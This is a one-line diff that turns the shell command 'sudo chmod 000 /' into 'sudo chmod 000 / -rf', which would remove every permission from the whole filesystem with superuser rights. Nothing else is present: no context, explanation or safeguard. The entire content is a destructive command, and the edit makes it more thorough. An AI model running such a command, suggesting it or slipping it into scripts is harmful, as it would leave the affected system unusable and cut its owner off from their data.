@@ -1,1 +1,1 @@
-sudo chmod 000 /
+sudo chmod 000 / -rf
